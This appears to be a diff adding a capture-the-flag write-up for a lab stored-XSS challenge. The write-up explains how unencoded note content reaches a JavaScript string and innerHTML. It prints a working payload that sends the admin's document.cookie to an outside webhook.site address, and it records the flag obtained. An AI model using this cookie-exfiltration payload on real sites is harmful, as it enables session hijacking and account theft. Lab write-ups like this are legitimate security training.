@@ -1,0 +1,26 @@
+Challenge: CNSxSS
+Target: http://10.0.118.48:4444
+
+Vulnerability:
+- Stored Cross-Site Scripting (XSS).
+- User-controlled `content` is inserted into a JavaScript string and then rendered with `innerHTML`:
+  - `const note = "...";`
+  - `note_el.innerHTML = clean;`
+- No output encoding/sanitization allows breaking out of the JS string and executing attacker script.
+
+Steps taken to get the flag:
+1. Created a note and inspected its page source.
+2. Confirmed `content` reaches a script block unsafely and then goes to `innerHTML`.
+3. Crafted payload:
+   `";new Image().src="https://webhook.site/<token>?c="+encodeURIComponent(document.cookie);//`
+4. Submitted the malicious note and clicked/replayed `POST /report/<note_id>` ("Send to Overlords!").
+5. Admin bot visited the note and executed payload.
+6. Webhook request captured admin context; flag appeared in request `User-Agent` as:
+   `flag=cns431_d4ng3r_n0_val1dat1on_xss`
+
+Flag:
+cns431_d4ng3r_n0_val1dat1on_xss
+
+Automation:
+- Script added: 12-cnsxss.py
+- It creates a webhook token, submits XSS note, reports it, polls webhook logs, and extracts the flag.
